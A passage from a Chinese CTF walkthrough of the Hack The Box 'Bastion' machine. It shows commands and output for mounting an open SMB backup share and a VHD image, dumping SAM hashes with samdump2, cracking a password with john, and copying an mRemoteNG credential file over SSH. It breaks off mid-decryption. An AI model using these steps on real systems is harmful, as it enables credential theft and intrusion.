\u6620\u50cf\u5907\u4efd\u53ef\u80fd\u5f88\u5927\uff0c\u4f20\u8f93\u901f\u5ea6\u4f1a\u5f88\u6162\uff08\u5982\u6ce8\u91ca\u8b66\u544a\u7684\u90a3\u6837\uff09\u3002\u6211\u4e0d\u4f1a\u5c1d\u8bd5\u590d\u5236\u5b83\uff0c\u800c\u662f\u5c06\u6b64\u5171\u4eab\u6302\u8f7d\u5230\u6211\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u3002</p>"},{"location":"CTF/HTB/Windows-Bastion/index.html#mountguestmount","title":"Mount&amp;&amp;guestmount","text":"<pre><code>root@kali# mount -t cifs //10.10.10.134/backups /mnt -o user=,password=\nroot@kali# ls /mnt/\nnote.txt  SDT65CB.tmp  WindowsImageBackup\n</code></pre> <p>\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u4e8e\u5728 Kali Linux \u4e0a\u6302\u8f7d\u4e00\u4e2a\u8fdc\u7a0b\u7684 CIFS\uff08Common Internet File System\uff09\u5171\u4eab\u76ee\u5f55\u5230\u672c\u5730\u7684 /mnt \u76ee\u5f55\u7684\u3002\u8ba9\u6211\u89e3\u91ca\u4e00\u4e0b\uff1a</p> <ul> <li> <p>mount\uff1a\u8fd9\u662f Linux \u4e2d\u7528\u4e8e\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf\u7684\u547d\u4ee4\u3002</p> </li> <li> <p>-t cifs\uff1a\u8fd9\u662f\u6307\u5b9a\u8981\u6302\u8f7d\u7684\u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\uff0c\u5373 CIFS \u6587\u4ef6\u7cfb\u7edf\uff0cCIFS \u662f\u4e00\u79cd\u7528\u4e8e\u5728\u7f51\u7edc\u4e0a\u5171\u4eab\u6587\u4ef6\u7684\u534f\u8bae\uff0c\u901a\u5e38\u5728 Windows \u73af\u5883\u4e2d\u4f7f\u7528\u3002</p> </li> <li> <p>//10.10.10.134/backups\uff1a\u8fd9\u662f\u8fdc\u7a0b CIFS \u5171\u4eab\u7684\u8def\u5f84\uff0c\u5176\u4e2d 10.10.10.134 \u662f\u8fdc\u7a0b\u4e3b\u673a\u7684 IP \u5730\u5740\uff0c/backups \u662f\u5171\u4eab\u7684\u76ee\u5f55\u8def\u5f84\u3002</p> </li> <li> <p>/mnt\uff1a\u8fd9\u662f\u8981\u6302\u8f7d\u5230\u7684\u672c\u5730\u76ee\u5f55\uff0c\u5373\u6302\u8f7d\u70b9\u3002</p> </li> <li> <p>-o user=,password=\uff1a\u8fd9\u662f\u9009\u9879\u53c2\u6570\uff0c\u6307\u5b9a\u4e86\u8981\u4f7f\u7528\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002\u5728\u8fd9\u91cc\uff0c\u7531\u4e8e\u7528\u6237\u540d\u548c\u5bc6\u7801\u6ca1\u6709\u63d0\u4f9b\uff0c\u8fd9\u610f\u5473\u7740\u9700\u8981\u624b\u52a8\u8f93\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u4f60\u9700\u8981\u5c06\u8fd9\u91cc\u7684 user \u548c password \u66ff\u6362\u4e3a\u8fdc\u7a0b\u5171\u4eab\u76ee\u5f55\u7684\u6709\u6548\u7528\u6237\u540d\u548c\u5bc6\u7801\u3002</p> </li> </ul> <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u6761\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u5c06\u8fdc\u7a0b\u7684 CIFS \u5171\u4eab\u76ee\u5f55\u6302\u8f7d\u5230\u672c\u5730\u7cfb\u7edf\u7684 /mnt \u76ee\u5f55\uff0c\u4ee5\u4fbf\u5728\u672c\u5730\u8bbf\u95ee\u548c\u64cd\u4f5c\u8fdc\u7a0b\u5171\u4eab\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u3002</p> <p>mount\u547d\u4ee4\u6559\u7a0b\uff1ahttps://www.linuxcool.com/mount</p> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u6587\u4ef6\u4e86\u3002\u8fd9\u4e2a\u53ef\u80fd\u662f\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6\u5939\u3002\u5728\u4e00\u4e9b\u5c1d\u8bd5\u4e4b\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4e00\u4e9b\u6709\u8da3\u7684\u6587\u4ef6\u3002</p> <pre><code>root@kali# find /mnt/ -type f\n/mnt/note.txt\n/mnt/SDT65CB.tmp\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/BackupSpecs.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml\n/mnt/WindowsImageBackup/L4mpje-PC/Catalog/BackupGlobalCatalog\n/mnt/WindowsImageBackup/L4mpje-PC/Catalog/GlobalCatalog\n/mnt/WindowsImageBackup/L4mpje-PC/MediaId\n/mnt/WindowsImageBackup/L4mpje-PC/SPPMetadataCache/{cd113385-65ff-4ea2-8ced-5630f6feca8f}\n</code></pre> <p>\u6709\u4e24\u4e2avhd\u6587\u4ef6\uff0cVHD\u6587\u4ef6\u662fVirtual Hard Desk, \u8fd9\u662f\u4e00\u79cd\u516c\u5f00\u53ef\u7528\u7684\u56fe\u50cf\u683c\u5f0f\u89c4\u8303\uff0c\u5141\u8bb8\u5c06\u78c1\u76d8\u5c01\u88c5\u5728\u5355\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4f9b\u64cd\u4f5c\u7cfb\u7edf\u7528\u4f5c\u865a\u62df\u78c1\u76d8\uff0c\u4f7f\u7528\u65b9\u5f0f\u4e0e\u64cd\u4f5c\u7269\u7406\u78c1\u76d8\u76f8\u540c\u3002</p> <p>VHD\u662f\u8868\u793a\u865a\u62df\u786c\u76d8\u9a71\u52a8\u5668\uff08HDD\uff09\u7684\u6587\u4ef6\u683c\u5f0f\u3002\u5b83\u53ef\u80fd\u5305\u542b\u7269\u7406HDD\u4e0a\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\u78c1\u76d8\u5206\u533a\u548c\u6587\u4ef6\u7cfb\u7edf\uff0c\u800c\u540e\u8005\u53c8\u53ef\u4ee5\u5305\u542b\u6587\u4ef6\u548c\u6587\u4ef6\u5939\u3002\u5b83\u901a\u5e38\u7528\u4f5c\u865a\u62df\u673a\u7684\u786c\u76d8\u3002</p> <p>\u6240\u4ee5\u8fd9\u4e2a VHD \u6587\u4ef6\u91cc\u9762\u53ef\u80fd\u5305\u542b\u4e86\u66f4\u6709\u7528\u7684\u4fe1\u606f\u3002\u8fd9\u91cc\u9762\u6709 2 \u4e2a VHD \u6587\u4ef6\uff0c\u4e00\u4e2a\u662f 37M\uff0c\u4e00\u4e2a\u662f 5.1G\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u5927\u7684\u53ef\u80fd\u66f4\u6709\u7528\u3002\u4f46\u662f\u8981\u628a\u6574\u4e2a VHD \u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u5b9e\u5728\u662f\u592a\u56f0\u96be\u4e86\uff0c\u5c24\u5176\u662f\u5728\u8fd9\u6837\u7684\u7f51\u7edc\u4e0b\u3002\u800c\u4e14\u9776\u673a\u7684\u4f5c\u8005\u4e5f\u5728\u8bba\u575b\u91cc\u9762\u8bf4\u8fc7\u4f60\u6839\u672c\u4e0d\u9700\u8981\u5c06\u6574\u4e2a VHD \u6587\u4ef6\u4e0b\u8f7d\u4e0b\u6765\u3002\u90a3\u5c31\u5c06 VHD \u6587\u4ef6\u6302\u8f7d\u5230 kali\uff1a<code>guestmountapt install libguestfs-tools</code></p> <p>guestmount \u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u4f60\u5c06\u865a\u62df\u673a\u4e2d\u7684\u786c\u76d8\u6620\u50cf\uff08\u4f8b\u5982 QEMU \u7684 QCOW2 \u683c\u5f0f\u3001VMware \u7684 VMDK \u683c\u5f0f\u7b49\uff09\u6302\u8f7d\u5230\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u4ee5\u4fbf\u5728\u4e3b\u673a\u7cfb\u7edf\u4e0a\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u3002\u8fd9\u4f7f\u5f97\u4f60\u53ef\u4ee5\u5728\u4e0d\u542f\u52a8\u865a\u62df\u673a\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u4ece\u4e3b\u673a\u7cfb\u7edf\u4e2d\u8bbf\u95ee\u548c\u64cd\u4f5c\u865a\u62df\u673a\u4e2d\u7684\u6587\u4ef6\uff0c\u4ece\u800c\u65b9\u4fbf\u5730\u8fdb\u884c\u6587\u4ef6\u6062\u590d\u3001\u5907\u4efd\u3001\u67e5\u770b\u548c\u4fee\u6539\u7b49\u64cd\u4f5c\u3002</p> <p>\u901a\u8fc7 guestmount \u547d\u4ee4\uff0c\u4f60\u53ef\u4ee5\u5c06\u865a\u62df\u673a\u4e2d\u7684\u786c\u76d8\u6620\u50cf\u6302\u8f7d\u5230\u4e3b\u673a\u7cfb\u7edf\u7684\u6307\u5b9a\u6302\u8f7d\u70b9\u4e0a\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u50cf\u64cd\u4f5c\u666e\u901a\u6587\u4ef6\u7cfb\u7edf\u4e00\u6837\u6765\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u865a\u62df\u673a\u7684\u786c\u76d8\u6620\u50cf\u4f1a\u88ab\u89c6\u4e3a\u4e00\u4e2a\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u4e3b\u673a\u7cfb\u7edf\u7684\u6587\u4ef6\u7ba1\u7406\u5de5\u5177\u6216\u547d\u4ee4\u884c\u6765\u8fdb\u884c\u64cd\u4f5c\u3002</p> <p>\u4f7f\u7528 guestmount \u53ef\u4ee5\u65b9\u4fbf\u5730\u6267\u884c\u4e00\u4e9b\u5e38\u89c1\u7684\u4efb\u52a1\uff0c\u4f8b\u5982\u4ece\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u6587\u4ef6\u3001\u68c0\u67e5\u865a\u62df\u673a\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u3001\u4fee\u6539\u865a\u62df\u673a\u4e2d\u7684\u6587\u4ef6\u5185\u5bb9\u7b49\u3002\u8fd9\u5bf9\u4e8e\u865a\u62df\u5316\u73af\u5883\u4e2d\u7684\u7cfb\u7edf\u7ba1\u7406\u3001\u6545\u969c\u6392\u9664\u548c\u6570\u636e\u6062\u590d\u7b49\u5de5\u4f5c\u975e\u5e38\u6709\u7528\u3002</p> <p>\u73b0\u5728\uff0c\u6211\u5c06\u5c1d\u8bd5\u88c5\u8f7d\u4e24\u4e2a VHD \u6587\u4ef6\u4e2d\u7684\u6bcf\u4e00\u4e2a\u3002\u7b2c\u4e00\u4e2a\u5931\u8d25\uff1a</p> <pre><code>root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/\nguestmount: no operating system was found on this disk\n\nIf using guestfish \u2018-i\u2019 option, remove this option and instead\nuse the commands \u2018run\u2019 followed by \u2018list-filesystems\u2019.\nYou can then mount filesystems you want by hand using the\n\u2018mount\u2019 or \u2018mount-ro\u2019 command.\n\nIf using guestmount \u2018-i\u2019, remove this option and choose the\nfilesystem(s) you want to see by manually adding \u2018-m\u2019 option(s).\nUse \u2018virt-filesystems\u2019 to see what filesystems are available.\n\nIf using other virt tools, this disk image won\u2019t work\nwith these tools.  Use the guestfish equivalent commands\n(see the virt tool manual page).\n</code></pre> <p>\u7b2c\u4e8c\u4e2a\u5de5\u4f5c\uff0c\u63d0\u4f9b\u5bf9\u770b\u8d77\u6765\u50cf Windows \u6587\u4ef6\u7cfb\u7edf\u6839\u76ee\u5f55\u7684\u8bbf\u95ee\uff1a</p> <pre><code>root@kali# guestmount --add /mnt/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt2/\nroot@kali# ls /mnt2/\n'$Recycle.Bin'   autoexec.bat   config.sys  'Documents and Settings'   pagefile.sys   PerfLogs   ProgramData  'Program Files'   Recovery  'System Volume Information'   Users   Windows\n</code></pre> <p>\u73b0\u5728\u8fdb\u5165/mnt2/\u5c31\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u9776\u673a\u7684\u5907\u4efd\u7684windows\u7cfb\u7edf</p> <pre><code>\u250c\u2500\u2500(root kali)-[~/mnt2]\n\u2514\u2500# ll                   \n\u603b\u7528\u91cf 2096729\ndrwxrwxrwx 1 root root          0  2\u6708 22  2019 '$Recycle.Bin'\n-rwxrwxrwx 1 root root         24  6\u6708 10  2009  autoexec.bat\n-rwxrwxrwx 1 root root         10  6\u6708 10  2009  config.sys\nlrwxrwxrwx 2 root root         14  7\u6708 14  2009 'Documents and Settings' -&gt; /sysroot/Users\n-rwxrwxrwx 1 root root 2147016704  2\u6708 22  2019  pagefile.sys\ndrwxrwxrwx 1 root root          0  7\u6708 13  2009  PerfLogs\ndrwxrwxrwx 1 root root       4096  7\u6708 14  2009  ProgramData\ndrwxrwxrwx 1 root root       4096  4\u6708 11  2011 'Program Files'\ndrwxrwxrwx 1 root root          0  2\u6708 22  2019  Recovery\ndrwxrwxrwx 1 root root       4096  2\u6708 22  2019 'System Volume Information'\ndrwxrwxrwx 1 root root       4096  2\u6708 22  2019  Users\ndrwxrwxrwx 1 root root      16384  2\u6708 22  2019  Windows\n</code></pre>"},{"location":"CTF/HTB/Windows-Bastion/index.html#samdump2sam","title":"samdump2\u62ff\u5230sam\u54c8\u5e0c","text":"<p>samdump2 \u662f\u4e00\u6b3e\u7528\u4e8e\u63d0\u53d6 Windows \u7cfb\u7edf SAM \u6570\u636e\u5e93\u4e2d\u5bc6\u7801\u54c8\u5e0c\u7684\u5de5\u5177\u3002\u5728 Windows \u7cfb\u7edf\u4e2d\uff0c\u7528\u6237\u5bc6\u7801\u54c8\u5e0c\u4ee5\u53ca\u5176\u4ed6\u5b89\u5168\u76f8\u5173\u4fe1\u606f\u5b58\u50a8\u5728 SAM\uff08Security Account Manager\uff09\u6570\u636e\u5e93\u4e2d\u3002samdump2 \u53ef\u4ee5\u5e2e\u52a9\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u5728\u5408\u6cd5\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u4ece Windows \u7cfb\u7edf\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\uff0c\u7528\u4e8e\u8fdb\u4e00\u6b65\u7684\u5bc6\u7801\u7834\u89e3\u6216\u5206\u6790\u3002</p> <p>samdump2\u4f7f\u7528\u6559\u7a0b\uff1ahttps://blog.csdn.net/lijiajin1228/article/details/104085326</p> <p>\u73b0\u5728\u6211\u4eec\u6765\u5230/mnt2/windows/Windows/System32/config\u76ee\u5f55,\u6211\u4eec\u53ef\u4ee5\u5728\u91cc\u9762\u53d1\u73b0\u4e00\u4e2a SAM \u6587\u4ef6\u3002\u5b89\u5168\u5e10\u6237\u7ba1\u7406\u5668\uff08SAM\uff09\u662f Windows \u4e2d\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u5bc6\u7801\u7684\u6570\u636e\u5e93\u6587\u4ef6\u3002\u5c1d\u8bd5\u8bbf\u95ee SAM \u6587\u4ef6\uff0c\u4f7f\u7528samdump2\u547d\u4ee4\u6253\u5370\u51fa\u8be5\u7cfb\u7edf\u5185sam\u4fdd\u5b58\u7684\u54c8\u5e0c\u4fe1\u606f.</p> <pre><code>\u250c\u2500\u2500(root kali)-[~/\u2026/windows/Windows/System32/config]\n\u2514\u2500# samdump2 SYSTEM SAM                                                                                                                                                                                                               127 \u2a2f\n*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nL4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::\n</code></pre> <p>\u622a\u53d6<code>L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</code>\u4fdd\u5b58\u5230\u672c\u5730<code>hash.txt</code>\u6587\u4ef6</p>"},{"location":"CTF/HTB/Windows-Bastion/index.html#john","title":"john\u7834\u89e3","text":"<pre><code>root@kali# john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (NT [MD4 128/128 AVX 4x3])\nWarning: no OpenMP support for this hash type, consider --fork=4\nPress 'q' or Ctrl-C to abort, almost any other key for status\nbureaulampje     (L4mpje)\n1g 0:00:00:00 DONE (2021-12-23 02:57) 1.176g/s 11053Kp/s 11053Kc/s 11053KC/s buresres..burdy1\nUse the \"--show --format=NT\" options to display all of the cracked passwords reliably\nSession completed\n</code></pre> <p>\u5f97\u5230\u4e00\u4e2a\u767b\u9646\u51ed\u8bc1\uff1a<code>L4mpje : bureaulampje</code></p> <p>\u5bb9\u6613\u6211\u4eec\u5c31\u7834\u89e3\u4e86\u8fd9\u4e2a\u54c8\u5e0c\u3002\u800c\u4e14\u636e\u6211\u4eec\u4e00\u5f00\u59cb\u83b7\u53d6\u7684\u4fe1\u606f\uff0c\u8fd9\u53f0\u9776\u673a\u662f\u5f00\u653e\u4e86 ssh \u670d\u52a1\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5c1d\u8bd5\u4f7f\u7528 L4mpje \u4f5c\u4e3a\u7528\u6237\u540d\u6765\u767b\u5f55\u3002\u5f88\u5e78\u8fd0\uff0c\u6211\u4eec\u8fdb\u6765\u4e86\u3002</p> <pre><code>ssh L4mpje@10.10.10.134\nMicrosoft Windows [Version 10.0.14393]                                                                                          \n(c) 2016 Microsoft Corporation. All rights reserved.                                                                                                                                                                           \nl4mpje@BASTION C:\\Users\\L4mpje&gt;whoami                                                                                           \nbastion\\l4mpje\n</code></pre>"},{"location":"CTF/HTB/Windows-Bastion/index.html#_3","title":"\u63d0\u6743","text":"<p>\u5728\u4f7f\u7528 L4mpje \u7528\u6237\u767b\u5f55\u6210\u529f\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u6211\u4eec\u7684\u6743\u9650\u5f88\u6709\u9650\u3002\u4e00\u822c\u63d0\u6743\u53ef\u4ee5\u5229\u7528\u67d0\u4e9b\u8f6f\u4ef6\u7684\u6f0f\u6d1e\u6765\u5b8c\u6210\u3002\u6240\u4ee5\uff0c\u63a2\u6d4b\u8fd9\u4e2a\u9776\u673a\u5b89\u88c5\u4e86\u54ea\u4e9b\u8f6f\u4ef6\u5f88\u6709\u610f\u4e49\u3002</p> <pre><code>PS C:\\Program Files (x86)&gt; dir\n    Directory: C:\\Program Files (x86)\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----        16-7-2016     15:23                Common Files\nd-----        23-2-2019     09:38                Internet Explorer\nd-----        16-7-2016     15:23                Microsoft.NET\nda----        22-2-2019     14:01                mRemoteNG\nd-----        23-2-2019     10:22                Windows Defender\nd-----        23-2-2019     09:38                Windows Mail\nd-----        23-2-2019     10:22                Windows Media Player\nd-----        16-7-2016     15:23                Windows Multimedia Platform\nd-----        16-7-2016     15:23                Windows NT\nd-----        23-2-2019     10:22                Windows Photo Viewer\nd-----        16-7-2016     15:23                Windows Portable Devices\nd-----        16-7-2016     15:23                WindowsPowerShell\n</code></pre> <p>mRemoteNG\u662f\u4e00\u79cd\u8fdc\u7a0b\u8fde\u63a5\u7ba1\u7406\u5de5\u5177\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u4fdd\u5b58\u5404\u79cd\u7c7b\u578b\u8fde\u63a5\u7684\u5bc6\u7801\u3002\u7528\u6237\u7684 AppData \u76ee\u5f55\u4e2d\u6709\u4e00\u4e2a\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8be5\u4fe1\u606f\uff1a<code>confCons.xml</code></p> <pre><code>l4mpje@BASTION C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG&gt;dir                                                                    \n...                                                                       \n22-02-2019  15:03    &lt;DIR&gt;          .                                                                                           \n22-02-2019  15:03    &lt;DIR&gt;          ..                                                                                          \n22-02-2019  15:03             6.316 confCons.xml                                                                                \n22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                                     \n22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                                     \n22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                                     \n22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                                     \n22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                                     \n22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                                     \n22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                                     \n22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                                     \n22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                                     \n22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                                     \n22-02-2019  15:03                51 extApps.xml                                                                                 \n22-02-2019  15:03             5.217 mRemoteNG.log                                                                               \n22-02-2019  15:03             2.245 pnlLayout.xml                                                                               \n22-02-2019  15:01    &lt;DIR&gt;          Themes                                                                                      \n...\n</code></pre> <p>\u56e0\u4e3a\u9776\u673a\u5b89\u88c5\u4e86ssh\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u7528scp\u547d\u4ee4\u628a\u6587\u4ef6\u4ece\u9776\u673a\u4e0b\u8f7d\u5230kali</p> <pre><code>\u250c\u2500\u2500(root kali)-[~/htb/Bastion]\n\u2514\u2500# scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .                                                                                                                                                      1 \u2a2f\nl4mpje@10.10.10.134's password: \nconfCons.xml\n</code></pre> <p>\u67e5\u770bconfCons.xml\u6587\u4ef6\uff0c\u53d1\u73b0<code>Administrator</code>\u7684\u54c8\u5e0c\u5bc6\u7801\uff1a<code>aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==</code></p> <pre><code>\u250c\u2500\u2500(root kali)-[~/htb/Bastion]\n\u2514\u2500# cat confCons.xml                                    \n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;mrng:Connections xmlns:mrng=\"http://mremoteng.org\" Name=\"Connections\" Export=\"false\" EncryptionEngine=\"AES\" BlockCipherMode=\"GCM\" KdfIterations=\"1000\" FullFileEncryption=\"false\" Protected=\"ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA\" ConfVersion=\"2.6\"&gt;\n    &lt;Node Name=\"DC\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" Id=\"500e7d58-662a-44d4-aff0-3a4f547a3fee\" Username=\"Administrator\" Domain=\"\" Password=\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\" Hostname=\"127.0.0.1\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\" ConnectToConsole=\"false\" UseCredSsp=\"true\" RenderingEngine=\"IE\" ICAEncryptionStrength=\"EncrBasic\" RDPAuthenticationLevel=\"NoAuth\" RDPMinutesToIdleTimeout=\"0\" RDPAlertIdleTimeout=\"false\" LoadBalanceInfo=\"\" Colors=\"Colors16Bit\" Resolution=\"FitToWindow\" AutomaticResize=\"true\" DisplayWallpaper=\"false\" DisplayThemes=\"false\" EnableFontSmoothing=\"false\" EnableDesktopComposition=\"false\" CacheBitmaps=\"false\" RedirectDiskDrives=\"false\" RedirectPorts=\"false\" RedirectPrinters=\"false\" RedirectSmartCards=\"false\" RedirectSound=\"DoNotPlay\" SoundQuality=\"Dynamic\" RedirectKeys=\"false\" Connected=\"false\" PreExtApp=\"\" PostExtApp=\"\" MacAddress=\"\" UserField=\"\" ExtApp=\"\" VNCCompression=\"CompNone\" VNCEncoding=\"EncHextile\" VNCAuthMode=\"AuthVNC\" VNCProxyType=\"ProxyNone\" VNCProxyIP=\"\" VNCProxyPort=\"0\" VNCProxyUsername=\"\" VNCProxyPassword=\"\" VNCColors=\"ColNormal\" VNCSmartSizeMode=\"SmartSAspect\" VNCViewOnly=\"false\" RDGatewayUsageMethod=\"Never\" RDGatewayHostname=\"\" RDGatewayUseConnectionCredentials=\"Yes\" RDGatewayUsername=\"\" RDGatewayPassword=\"\" RDGatewayDomain=\"\" InheritCacheBitmaps=\"false\" InheritColors=\"false\" InheritDescription=\"false\" InheritDisplayThemes=\"false\" InheritDisplayWallpaper=\"false\" InheritEnableFontSmoothing=\"false\" InheritEnableDesktopComposition=\"false\" InheritDomain=\"false\" InheritIcon=\"false\" InheritPanel=\"false\" InheritPassword=\"false\" InheritPort=\"false\" InheritProtocol=\"false\" InheritPuttySession=\"false\" InheritRedirectDiskDrives=\"false\" InheritRedirectKeys=\"false\" InheritRedirectPorts=\"false\" InheritRedirectPrinters=\"false\" InheritRedirectSmartCards=\"false\" InheritRedirectSound=\"false\" InheritSoundQuality=\"false\" InheritResolution=\"false\" InheritAutomaticResize=\"false\" InheritUseConsoleSession=\"false\" InheritUseCredSsp=\"false\" InheritRenderingEngine=\"false\" InheritUsername=\"false\" InheritICAEncryptionStrength=\"false\" InheritRDPAuthenticationLevel=\"false\" InheritRDPMinutesToIdleTimeout=\"false\" InheritRDPAlertIdleTimeout=\"false\" InheritLoadBalanceInfo=\"false\" InheritPreExtApp=\"false\" InheritPostExtApp=\"false\" InheritMacAddress=\"false\" InheritUserField=\"false\" InheritExtApp=\"false\" InheritVNCCompression=\"false\" InheritVNCEncoding=\"false\" InheritVNCAuthMode=\"false\" InheritVNCProxyType=\"false\" InheritVNCProxyIP=\"false\" InheritVNCProxyPort=\"false\" InheritVNCProxyUsername=\"false\" InheritVNCProxyPassword=\"false\" InheritVNCColors=\"false\" InheritVNCSmartSizeMode=\"false\" InheritVNCViewOnly=\"false\" InheritRDGatewayUsageMethod=\"false\" InheritRDGatewayHostname=\"false\" InheritRDGatewayUseConnectionCredentials=\"false\" InheritRDGatewayUsername=\"false\" InheritRDGatewayPassword=\"false\" InheritRDGatewayDomain=\"false\" /&gt;\n</code></pre> <p>\u8fd9\u4e32\u5bc6\u7801\u770b\u4e0a\u53bb\u50cfbash64\uff0c\u4f46\u5176\u5b9e\u4e0d\u662f\u3002\u5728\u8c37\u6b4c\u4e0a\u641c\u7d22mremoteng decrypt\u627e\u5230\u8fd9\u4e2amremoteng decrypt\u811a\u672c</p> <p>\u89e3\u5bc6</p> <pre><code>root@kali#  python3 mremoteng_decrypt.py -s 